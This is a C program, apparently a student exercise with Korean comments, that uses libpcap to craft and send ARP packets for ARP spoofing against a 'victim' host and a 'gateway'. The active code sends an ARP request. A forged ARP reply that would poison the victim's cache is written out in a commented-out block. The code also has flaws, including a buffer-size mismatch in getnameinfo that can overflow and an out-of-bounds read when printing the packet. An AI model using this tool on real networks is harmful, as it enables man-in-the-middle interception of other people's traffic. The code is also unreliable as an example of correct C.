/* send ARP reply for ARP spoofing */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <linux/if_ether.h>
#include <netinet/ether.h>

#include <sys/types.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pcap.h>


#define IP_ADDR_LEN      4
#define IP_STR_BUF_LEN   16

#define MAC_ADDR_LEN     6
#define MAC_STR_BUF_LEN  MAC_ADDR_LEN*2 + 5 + 1
#define ETH_HEADER_SIZE  14   // 6 + 6 + 2

#define SYS_NET_PATH      "/sys/class/net/%s/address"
#define SYS_NET_PATH_LEN  24
#define PROC_ARP_PATH     "/proc/net/arp"
#define INT_NAME_MAX_LEN  15
#define ARP_TABLE_ENTRY_LEN 128

#define BROADCAST_ETH_STR   "ff:ff:ff:ff:ff:ff"
#define ARP_REQ_DST_MAC_STR "00:00:00:00:00:00"

#define ARP_REQUEST 1
#define ARP_REPLY   2
 
#define NI_MAXHOST 1025
#define NI_NUMERICHOST 1


typedef struct _eth_header {
  uint8_t dst_addr[MAC_ADDR_LEN];
  uint8_t src_addr[MAC_ADDR_LEN];
  uint16_t ether_type;   // next protocol type
} __attribute__ ((packed)) eth_header;

typedef struct _arp_packet {
  uint16_t hd_type;
  uint16_t protocol_type;
  uint8_t  hd_size;
  uint8_t  protocol_size;
  uint16_t opcode;
  uint8_t  src_mac[MAC_ADDR_LEN];
  uint32_t  src_ip;
  uint8_t  dst_mac[MAC_ADDR_LEN];
  uint32_t  dst_ip; 
} __attribute__ ((packed)) arp_packet;

typedef struct _eth_arp_packet {
  eth_header eth;
  arp_packet arp;
  // uint8_t padding[18];
} __attribute__ ((packed)) eth_arp_packet;


void print_mac_addr(const char*, uint8_t (*)[6]);
void print_packet(u_char* p);

char* get_dev_mac(const char* dev);
char* get_src_ip_str(const char* dev);
char* get_hosts_mac(const char* target_ip_str);

void fill_eth_header(eth_header*, const char*, const char*, uint16_t);
void fill_arp_packet(arp_packet*, const char*, const char*, const char*, const char*, uint16_t);




void usage(char *fname) {
  printf("syntax: %s <interface> <sender ip(victim)> <target ip(gateway)>\n", fname);
  printf("sample: %s wlan0 192.168.110.129 192.168.110.1\n", fname);
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage(argv[0]);
    return -1;
  }
  char* dev = argv[1];
  char* victim_ip_str  = argv[2];
  char* gateway_ip_str = argv[3];

  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  eth_arp_packet* packet = (eth_arp_packet*)malloc(sizeof(eth_arp_packet));
  char* src_mac_str    = get_dev_mac(dev);
  char* victim_mac_str = get_hosts_mac(victim_ip_str);
  if ((src_mac_str == NULL) || (victim_mac_str == NULL)) {
    perror("[*] get_????_mac() error");
    return -1;
  }

  /* ***여기서 ether_aton(src_mac_str)을 계산해서 넘기지 않는 이유***
   ether_aton() 함수는 호출하자마자 결과로 리턴된 주소값을 어딘가에 memcpy()해두어야 한다.
   다음 ether_aton() 호출 시 바로 덮어 써져서 날아가기 때문.
   그 외에 string을 넘기면 좀 더 wrapping할 수 있다는 장점도 있다. */

  char* src_ip_str = get_src_ip_str(dev);
  printf("%s\n", src_ip_str);

  fill_eth_header(&packet->eth, src_mac_str, BROADCAST_ETH_STR, ETH_P_ARP);
  fill_arp_packet(&packet->arp, src_mac_str, ARP_REQ_DST_MAC_STR, src_ip_str, victim_ip_str, ARP_REQUEST);
  print_mac_addr("src_mac : ", (uint8_t (*)[6])packet->eth.src_addr);
  print_mac_addr("dst_mac : ", (uint8_t (*)[6])packet->eth.dst_addr);  
  print_packet((u_char*)packet);
  if (pcap_sendpacket(handle, (u_char*)packet, sizeof(eth_arp_packet)) == -1) {
      fprintf(stderr, "[*] send error : %s\n", pcap_geterr(handle));
  }

  

  /*
  fill_eth_header(&packet->eth, src_mac_str, victim_mac_str, ETH_P_ARP);
  fill_arp_packet(&packet->arp, src_mac_str, victim_mac_str, gateway_ip_str, victim_ip_str, ARP_REPLY);
  
  print_mac_addr("src_mac : ", (uint8_t (*)[6])packet->eth.src_addr);
  print_mac_addr("dst_mac : ", (uint8_t (*)[6])packet->eth.dst_addr);  
  print_packet((u_char*)packet);
  
  if (pcap_sendpacket(handle, (u_char*)packet, sizeof(eth_arp_packet)) == -1) {
      fprintf(stderr, "[*] send error : %s\n", pcap_geterr(handle));
  }
  */

  free(src_mac_str);
  free(victim_mac_str);  
  free(src_ip_str);
  pcap_close(handle);
  return 0;

}

void fill_eth_header(eth_header* eth, const char* src_mac_str, const char* dst_mac_str, uint16_t type) {
  /** fill Ethernet header : MAC address 
   * output : (indirect) filled eth_header*
   * **/
  memcpy(&eth->src_addr, ether_aton(src_mac_str), MAC_ADDR_LEN);
  memcpy(&eth->dst_addr, ether_aton(dst_mac_str), MAC_ADDR_LEN);
  eth->ether_type = htons(type);
}

void fill_arp_packet(arp_packet* arp, const char* src_mac_str, const char* dst_mac_str,
                      const char* src_ip_str, const char* dst_ip_str, uint16_t opcode) {
  /** fill ARP pakcet 
   * output : (indirect) filled arp_packet*
   * **/
  arp->hd_type = htons(1);     // Ethernet일 경우 1
  arp->protocol_type = htons(ETH_P_IP);
  arp->hd_size = MAC_ADDR_LEN;
  arp->protocol_size = IP_ADDR_LEN;
  arp->opcode = htons(opcode);
  memcpy(&arp->src_mac, ether_aton(src_mac_str), MAC_ADDR_LEN);
  arp->src_ip = inet_addr(src_ip_str);    // inet_aton()와 struct in_addr을 사용해도 된다.
  memcpy(&arp->dst_mac, ether_aton(dst_mac_str), MAC_ADDR_LEN);
  arp->dst_ip = inet_addr(dst_ip_str);
}

char* get_src_ip_str(const char* dev) {
    struct ifaddrs *ifaddr, *ifa;
    int family, s, n;
    char* host = (char*)malloc(IP_STR_BUF_LEN);

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {
        if (ifa->ifa_addr == NULL)
            continue;

        family = ifa->ifa_addr->sa_family;

        if (family == AF_INET) {
            s = getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                    host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
            if (s != 0) {
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                exit(EXIT_FAILURE);
            }
            else if (!strncmp(ifa->ifa_name, dev, INT_NAME_MAX_LEN)) {
                break;
            }
        }
    }
    // printf("\t\taddress: %s <%s>\n", ifa->ifa_name, host);
    freeifaddrs(ifaddr);
    return host;
}

char* get_dev_mac(const char* dev) {
  size_t mac_path_len = SYS_NET_PATH_LEN + strlen(dev);
  char* mac_path = (char*)malloc(mac_path_len); 
  snprintf(mac_path, mac_path_len, SYS_NET_PATH, dev);

  FILE* fp = fopen(mac_path, "r");
  if (!fp) {
      fprintf(stderr, "[*] fopen(%s) error\n", mac_path);
      return NULL;
  }
  free(mac_path);

  char* mac_str = (char*)malloc(MAC_STR_BUF_LEN);
  fscanf(fp, "%s", mac_str);
  fclose(fp);

  return mac_str;
}

char* get_hosts_mac(const char* target_ip_str) {
  FILE* fp = fopen(PROC_ARP_PATH, "r");
  if (!fp) {
      fprintf(stderr, "[*] fopen(%s) error\n", PROC_ARP_PATH);
      return NULL;
  }
  
  char column[ARP_TABLE_ENTRY_LEN];
  if (!fgets(column, sizeof(column), fp)) {
    perror("[*] fgets error");
    return NULL;
  }
  // printf("%s\n", column);

  char* mac_str = (char*)malloc(MAC_STR_BUF_LEN);
  char  parsed_ip[IP_STR_BUF_LEN] = {0};
  
  fscanf(fp, "%s %*s %*s %s %*s %*s", parsed_ip, mac_str);
  while (strncmp(target_ip_str, parsed_ip, IP_STR_BUF_LEN-1) != 0) {
    if (feof(fp) != 0) {
      fprintf(stderr, "[*] There is no %s entry in ARP table\n", target_ip_str);
      return NULL;
    }
    fscanf(fp, "%s %*s %*s %s %*s %*s", parsed_ip, mac_str);
  }

  fclose(fp);
  return mac_str;
}


void print_mac_addr(const char* str, uint8_t (*a)[6]) {
  printf("%s", str);
  printf("%02x:%02x:%02x:%02x:%02x:%02x\n", (*a)[0]
                                          , (*a)[1]
                                          , (*a)[2]
                                          , (*a)[3]
                                          , (*a)[4]
                                          , (*a)[5]);
}

void print_packet(u_char* p) {
  int i;
  for (i = 1; i < sizeof(eth_arp_packet); i++) {
    printf("%02x ", p[i-1]);
    if (i % 16 == 0) {
      printf("\n");
    }
  }
  printf("%02x ", p[i]);
  printf("\n");
}